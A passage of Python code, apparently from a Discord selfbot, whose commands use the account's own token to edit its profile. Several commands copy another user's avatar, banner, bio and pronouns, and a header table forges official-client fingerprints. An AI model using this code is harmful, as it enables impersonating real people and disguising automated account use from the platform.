            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Asia/Calcutta",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJkZXNpZ25faWQiOjB9"
        }

    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                image_data = await response.read()
                image_b64 = base64.b64encode(image_data).decode()
                
                content_type = response.headers.get('Content-Type', '')
                if 'gif' in content_type:
                    image_format = 'gif'
                else:
                    image_format = 'png'

                payload = {
                    "banner": f"data:image/{image_format};base64,{image_b64}"
                }

                response = sesh.patch("https://discord.com/api/v9/users/@me", json=payload, headers=headers)
                
                if response.status_code == 200:
                    await ctx.send("```Successfully set banner```")
                else:
                    await ctx.send(f"```Failed to update banner: {response.status_code}```")
            else:
                await ctx.send("```Failed to download image from URL```")
                
@bot.command()
@require_password()
async def stealpfp(ctx, user: discord.Member = None):
    if not user:
        await ctx.send("```Please mention a user to steal their profile picture```")
        return

    headers = {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6Ik1hYyBPUyBYIiwiYnJvd3NlciI6IlNhZmFyaSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNi41IFNhZmFyaS82MDUuMS4xNSIsImJyb3dzZXJfdmVyc2lvbiI6IjE2LjUiLCJvc192ZXJzaW9uIjoiMTAuMTUuNyIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTA2ODQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
    avatar_format = "gif" if user.is_avatar_animated() else "png"
    avatar_url = str(user.avatar_url_as(format=avatar_format))

    async with aiohttp.ClientSession() as session:
        async with session.get(avatar_url) as response:
            if response.status == 200:
                image_data = await response.read()
                image_b64 = base64.b64encode(image_data).decode()

                payload = {
                    "avatar": f"data:image/{avatar_format};base64,{image_b64}"
                }

                response = sesh.patch("https://discord.com/api/v9/users/@me", json=payload, headers=headers)
                
                if response.status_code == 200:
                    await ctx.send(f"```Successfully stole {user.name}'s profile picture```")
                else:
                    await ctx.send(f"```Failed to update profile picture: {response.status_code}```")
            else:
                await ctx.send("```Failed to download the user's profile picture```")

@bot.command()
@require_password()
async def stealbanner(ctx, user: discord.Member = None):
    if not user:
        await ctx.send("```Please mention a user to steal their banner```")
        return

    headers = {
            "authority": "discord.com",
            "method": "PATCH",
            "scheme": "https",
            "accept": "/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "authorization": bot.http.token,
            "origin": "https://discord.com/",
            "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Asia/Calcutta",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJkZXNpZ25faWQiOjB9"
        }

    profile_url = f"https://discord.com/api/v9/users/{user.id}/profile"
    
    async with aiohttp.ClientSession() as session:
        async with session.get(profile_url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                banner_hash = data.get("user", {}).get("banner")
                
                if not banner_hash:
                    await ctx.send("```This user doesn't have a banner```")
                    return
                
                banner_format = "gif" if banner_hash.startswith("a_") else "png"
                banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_hash}.{banner_format}?size=1024"
                
                async with session.get(banner_url) as banner_response:
                    if banner_response.status == 200:
                        banner_data = await banner_response.read()
                        banner_b64 = base64.b64encode(banner_data).decode()
                        
                        payload = {
                            "banner": f"data:image/{banner_format};base64,{banner_b64}"
                        }
                        
                        response = sesh.patch("https://discord.com/api/v9/users/@me", json=payload, headers=headers)
                        
                        if response.status_code == 200:
                            await ctx.send(f"```Successfully stole {user.name}'s banner```")
                        else:
                            await ctx.send(f"```Failed to update banner: {response.status_code}```")
                    else:
                        await ctx.send("```Failed to download the user's banner```")
            else:
                await ctx.send("```Failed to fetch user profile```")
@bot.command()
@require_password()
async def setname(ctx, *, name: str = None):
    if not name:
        await ctx.send("```Please provide a name to set```")
        return

    headers = {
            "authority": "discord.com",
            "method": "PATCH",
            "scheme": "https",
            "accept": "/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "authorization": bot.http.token,
            "origin": "https://discord.com/",
            "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Asia/Calcutta",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJkZXNpZ25faWQiOjB9"
        }

    payload = {
        "global_name": name
    }

    response = sesh.patch("https://discord.com/api/v9/users/@me", json=payload, headers=headers)
    
    if response.status_code == 200:
        await ctx.send(f"```Successfully set global name to: {name}```")
    else:
        await ctx.send(f"```Failed to update global name: {response.status_code}```")
        
        
@bot.command()
@require_password()
async def setpronoun(ctx, *, pronoun: str):
    headers = {
        "Authorization": bot.http.token,
        "Content-Type": "application/json"
    }

    new_name = {
        "pronouns": pronoun
    }

    url_api_info = "https://discord.com/api/v9/users/%40me/profile"

    try:
        response = requests.patch(url_api_info, headers=headers, json=new_name)

        if response.status_code == 200:
            await ctx.send(f"```pronoun updated to: {pronoun}```")
        else:
            await ctx.send(f"```Failed to update pronoun : {response.status_code} - {response.json()}```")

    except Exception as e:
        await ctx.send(f"```An error occurred: {e}```")

@bot.command()
@require_password()
async def setbio(ctx, *, bio_text: str):
    headers = {
        "Content-Type": "application/json",
        "Authorization": bot.http.token
    }

    new_bio = {
        "bio": bio_text
    }

    url_api_info = "https://discord.com/api/v9/users/%40me/profile"
    
    try:
        response = requests.patch(url_api_info, headers=headers, json=new_bio)

        if response.status_code == 200:
            await ctx.send("```Bio updated successfully!```")
        else:
            await ctx.send(f"```Failed to update bio: {response.status_code} - {response.json()}```")

    except Exception as e:
        await ctx.send(f"```An error occurred: {e}```")



@bot.command()
@require_password()
async def stealbio(ctx, member: discord.User):
    url = f"https://discord.com/api/v9/users/{member.id}/profile?with_mutual_guilds=true&with_mutual_friends=true"
    headers = {
        "Authorization": bot.http.token
    }

    try:
        response = requests.get(url, headers=headers)
        data = response.json()

        if response.status_code == 200:
            target_bio = data.get("user", {}).get("bio", None)

            if target_bio:
                set_bio_url = "https://discord.com/api/v9/users/@me/profile"
                new_bio = {"bio": target_bio}

                update_response = requests.patch(set_bio_url, headers=headers, json=new_bio)

                if update_response.status_code == 200:
                    await ctx.send("```Bio updated!```")
                else:
                    await ctx.send(f"```Failed: {update_response.status_code} - {update_response.json()}```")
            else:
                await ctx.send("```user does not have a bio to copy.```")
        else:
            await ctx.send(f"```Failed: {response.status_code} - {data}```")

    except Exception as e:
        await ctx.send(f"```{e}```")
        
        
@bot.command()
@require_password()
async def stealpronoun(ctx, member: discord.User):
    url = f"https://discord.com/api/v9/users/{member.id}/profile?with_mutual_guilds=true&with_mutual_friends=true"
    headers = {
        "Authorization": bot.http.token
    }

    try:
        response = requests.get(url, headers=headers)
        data = response.json()

        if response.status_code == 200:
            target_pronouns = data.get("user_profile", {}).get("pronouns", None)

            if target_pronouns:
                set_pronoun_url = "https://discord.com/api/v9/users/%40me/profile"
                new_pronoun = {"pronouns": target_pronouns}

                update_response = requests.patch(set_pronoun_url, headers=headers, json=new_pronoun)

                if update_response.status_code == 200:
                    await ctx.send("```Pronouns stolen successful.```")
                else:
                    await ctx.send(f"```Failed: {update_response.status_code} - {update_response.json()}```")
            else:
                await ctx.send("```user does not have pronouns set to copy.```")
        else:
            await ctx.send(f"```Failed: {response.status_code} - {data}```")

    except Exception as e:
        await ctx.send(f"```{e}```")

@bot.command()
@require_password()
async def copyprofile(ctx, user: discord.Member = None):
    if not user:
        await ctx.send("```Please mention a user to copy their profile```")
        return

    headers = {
        "authority": "discord.com",
        "method": "PATCH",
        "scheme": "https",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "origin": "https://discord.com",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "X-Debug-Options": "bugReporterEnabled",
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "Asia/Calcutta",
        "Content-Type": "application/json",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJkZXNpZ25faWQiOjB9"
    }

    profile_url = f"https://discord.com/api/v9/users/{user.id}/profile"
    profile_response = sesh.get(profile_url, headers=headers)
    
    if profile_response.status_code == 200:
        profile_data = profile_response.json()
        
        avatar_url = str(user.avatar_url)
        avatar_response = sesh.get(avatar_url)
        if avatar_response.status_code == 200:
            image_b64 = base64.b64encode(avatar_response.content).decode()
            
            avatar_payload = {
                "avatar": f"data:image/png;base64,{image_b64}",
                "global_name": profile_data.get('user', {}).get('global_name')
            }
            sesh.patch("https://discord.com/api/v9/users/@me", headers=headers, json=avatar_payload)

            profile_payload = {
                "bio": profile_data.get('bio', ""),
                "pronouns": profile_data.get('pronouns', ""),
                "accent_color": profile_data.get('accent_color')
            }
            sesh.patch("https://discord.com/api/v9/users/@me/profile", headers=headers, json=profile_payload)

            await ctx.send(f"```Successfully copied {user.name}'s complete profile```")
        else:
            await ctx.send("```Failed to download avatar```")
    else:
        await ctx.send("```Failed to fetch profile data```")
@bot.command()
@require_password()
async def pbackup(ctx):
    headers = {
        "authority": "discord.com",
        "method": "PATCH",
        "scheme": "https",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "origin": "https://discord.com",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "X-Debug-Options": "bugReporterEnabled",
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "Asia/Calcutta",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJkZXNpZ25faWQiOjB9"
    }

    if not hasattr(bot, 'profile_backup'):
        async with aiohttp.ClientSession() as session:
            async with session.get('https://discord.com/api/v9/users/@me', headers=headers) as response:
                if response.status == 200:
                    profile_data = await response.json()
                    
                    avatar_url = str(ctx.author.avatar_url)
                    async with session.get(avatar_url) as avatar_response:
                        if avatar_response.status == 200:
                            image_data = await avatar_response.read()
                            image_b64 = base64.b64encode(image_data).decode()
                            
                            bot.profile_backup = {
                                "avatar": f"data:image/png;base64,{image_b64}",
                                "global_name": profile_data.get('global_name'),
                                "bio": profile_data.get('bio', ""),
                                "pronouns": profile_data.get('pronouns', ""),
                                "accent_color": profile_data.get('accent_color'),
                                "banner": profile_data.get('banner')
                            }
                            
                            await ctx.send("```Successfully backed up your profile```")
                        else:
                            await ctx.send("```Failed to backup avatar```")
                else:
                    await ctx.send("```Failed to fetch profile data for backup```")
    else:
        async with aiohttp.ClientSession() as session:
            response = await session.patch(
                "https://discord.com/api/v9/users/@me",
                json=bot.profile_backup,
                headers=headers
            )
            
            if response.status == 200:
                await ctx.send("```Successfully restored your profile from backup```")
                delattr(bot, 'profile_backup') 
            else:
                await ctx.send(f"```Failed to restore profile: {response.status}```")

DISCORD_HEADERS = {
    "standard": {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-discord-timezone": "America/New_York",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIxLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDY4NCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    },

    "client": {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3fQ=="
    },

    "mobile": {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Google Chrome";v="121", "Not A(Brand";v="99", "Chromium";v="121"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "user-agent": "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IkFuZHJvaWQiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiUGl4ZWwgNiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMzsgUGl4ZWwgNikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMS4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEyMS4wLjAuMCIsIm9zX3ZlcnNpb24iOiIxMyIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTA2ODQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    },

    "firefox": {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.5",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEyMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEyMi4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIyLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjUwNjg0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
    },

    "byoass": {
            "authority": "discord.com",
            "method": "PATCH",
            "scheme": "https",
            "accept": "/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "authorization": bot.http.token,
            "origin": "https://discord.com/",
            "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Asia/Calcutta",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJkZXNpZ25faWQiOjB9"
    },

    "desktop": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108"',
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
